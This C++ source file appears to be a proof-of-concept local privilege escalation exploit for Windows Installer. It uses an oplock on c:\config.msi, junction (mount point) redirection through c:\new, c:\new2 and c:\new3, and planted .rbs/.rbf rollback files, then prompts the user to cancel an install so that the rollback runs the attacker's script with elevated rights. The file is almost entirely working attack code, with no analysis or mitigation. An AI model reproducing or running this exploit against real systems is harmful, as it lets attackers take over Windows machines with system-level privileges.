#include "stdafx.h"
#include "ReparsePoint.h"
#include <iostream>
#include "FileOpLock.h"
#include <windows.h>
#include <iostream>
#include <shlobj.h>
#pragma comment(lib, "shell32.lib")
using namespace std;
bool triggered = false;
void UnlockFile()
{
	printf("triggered");
	triggered = true;
}
int _tmain()
{
	RemoveDirectory(L"c:\\new");
	RemoveDirectory(L"c:\\new2");
	RemoveDirectory(L"c:\\new3");
	CreateDirectory(L"c:\\new", NULL);
	CreateDirectory(L"c:\\new2", NULL);
	CreateDirectory(L"c:\\new3", NULL);
	CreateDirectory(L"c:\\config.msi", NULL);
	FileOpLock::CreateLock(L"c:\\config.msi", UnlockFile);
	LARGE_INTEGER li;
	HANDLE thread =  GetCurrentThread();
	SetThreadPriority(thread, THREAD_PRIORITY_TIME_CRITICAL);
	bool succesful = false;
		while (triggered == false)
	{
		QueryPerformanceCounter(&li);
	}
	triggered = false;
	FileOpLock::CreateLock(L"c:\\config.msi", UnlockFile);
	while (triggered == false)
	{
		QueryPerformanceCounter(&li);
	}
	triggered = false;
	do
	{
		HANDLE hJunction = CreateFile(L"c:\\config.msi", GENERIC_READ | FILE_WRITE_DATA,
			FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
			nullptr);
		succesful = ReparsePoint::CreateMountPoint(hJunction, L"c:\\new", L"");
		CloseHandle(hJunction);
	} while (succesful == false);
	wchar_t path[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, path);
	LPWSTR filename = L"\\test.rbs";
	wcscat_s(path, MAX_PATH, filename);
	LPCWSTR root = L"c:\\new3\\";
	wchar_t path2[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, path2);
	LPWSTR filename2 = L"\\test.rbf";
	wcscat_s(path2, MAX_PATH, filename2);
	//NEW -> NEW2
	HANDLE hJunction = CreateFile(L"c:\\new", GENERIC_READ | FILE_WRITE_DATA,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
		nullptr);
	ReparsePoint::CreateMountPoint(hJunction, L"c:\\new2", L"");
	CloseHandle(hJunction);
	HANDLE hFind;
	WIN32_FIND_DATA FindFileData;
	do
	{
		hFind = FindFirstFile(L"c:\\new\\*.rbs", &FindFileData);
	} while (hFind == INVALID_HANDLE_VALUE);
	LPCWSTR filename1 = FindFileData.cFileName;
	std::wstring df = std::wstring(root) + filename1;
	LPCWSTR dfc = df.c_str();
	CopyFile(path, dfc, true);
	CopyFile(path2, L"c:\\new3\\test1.rbf", true);
	//NEW -> NEW3 
	HANDLE hJunction3 = CreateFile(L"c:\\new", GENERIC_READ | FILE_WRITE_DATA,FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,nullptr);
	ReparsePoint::CreateMountPoint(hJunction3, L"c:\\new3", L"");
	CloseHandle(hJunction3);
	printf("\nPRESS CANCEL NOW TO TRIGGER ROLLBACK!");
	getchar();
	RemoveDirectory(L"c:\\new");
	RemoveDirectory(L"c:\\new2");
	RemoveDirectory(L"c:\\new3");
return 0;
}





